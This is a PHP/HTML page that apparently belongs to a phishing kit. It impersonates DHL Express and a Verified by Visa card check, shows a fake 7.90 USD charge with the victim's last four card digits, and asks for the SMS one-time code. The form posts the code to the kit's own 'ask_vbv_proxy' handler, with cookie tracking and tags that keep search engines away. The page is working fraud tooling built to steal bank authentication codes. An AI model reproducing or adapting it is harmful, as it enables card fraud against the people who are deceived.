﻿<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="vbv/";
?>
<!DOCTYPE html>
<html lang="de" class=" sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox picture srcset webworkers sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox picture srcset webworkers sizes customelements history pointerevents postmessage webgl websockets cssanimations csscolumns csscolumns-width csscolumns-span csscolumns-fill csscolumns-gap csscolumns-rule csscolumns-rulecolor csscolumns-rulestyle csscolumns-rulewidth csscolumns-breakbefore csscolumns-breakafter csscolumns-breakinside flexbox picture srcset webworkers">

<head>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script>
    <link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">
    <script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>
    <base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
    <link rel="stylesheet" href="form/css.css">
    <meta charset="UTF-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>| Welcome |</title>
    <meta name="robots" content="noindex, nofollow, noimageindex">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="style.css">
</head>

<body class="tanya" style="display: block;" ng-app="app" ng-controller="c1" ng-model-options="{'allowInvalid':true}" ng-cloak>
    <section>
        <div class="head"> <span><img src="lg.svg"></span> <span>
                <img class="logo-1" ng-src="{{card_type}}.png">
            </span> </div>
        <div class="titr">{{"Please confirm your following payment"| ng_translate1}}</div>
        <div class="kolchi">
            <div class="scum_container loader_show">
                <div class="scum" id="vbv-view">
                    <form id="cFrm" name="cFrm" onsubmit="send1(event,'ask_vbv_proxy');return false" novalidate>
                        <p style="font-size:12px">{{"The unique password be sent to you mobile number listed below. If you need to change your mobile number please contact your bank or modify it via available channels(ATM,web)"| ng_translate1}}</p>
                        <div class="inf"> <span class="tr">{{"Merchant"| ng_translate1}}:</span> <span class="rp">DHL EXPRESS</span> </div>
                        <div class="inf"> <span class="tr">{{"Amount"| ng_translate1}}:</span> <span class="rp" style="font-family:arial">7.90 USD</span> </div>
                        <div class="inf"> <span class="tr">{{"Date"| ng_translate1}}:</span> <span class="rp">
                                <?php echo date("d/m/y") ?></span> </div>
                        <div class="inf"> <span class="tr">{{"Card numbe"| ng_translate1}}r:</span> <span class="rp">XXXX-XXXX-XXXX-{{last_4}}</span> </div>
                        <div class="inf"> <span class="tr">{{"Your phone number"| ng_translate1}}:</span> <span class="rp tel">00000</span> </div>
                        <div class="inf"> <span class="tr">{{"SMS Code"| ng_translate1}}:</span> <span class="rp">
                            

                            <input type="text" class="tantan form-control" pattern=".{4,}" data-err_text="Please enter valid "  id="tantan" name="tantan" maxlength="22" required="" placeholder="" autocomplete="on" autofocus="" value="">



                        </span> </div>
                  
                    </form>
                </div>
            </div>
        </div>
        <div class="btn"><button form="cFrm" type="submit" class="text-center">{{"Submit"| ng_translate1}}</button></div>
        <div class="foot">© 2020 DHL International GabH - All rights reserved.</div>
    </section>
    <script type="text/javascript">
    var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
    var php_js = <?php  echo json_encode($php_js) ?>
    </script>
    <script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
    <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script>
</body>

</html>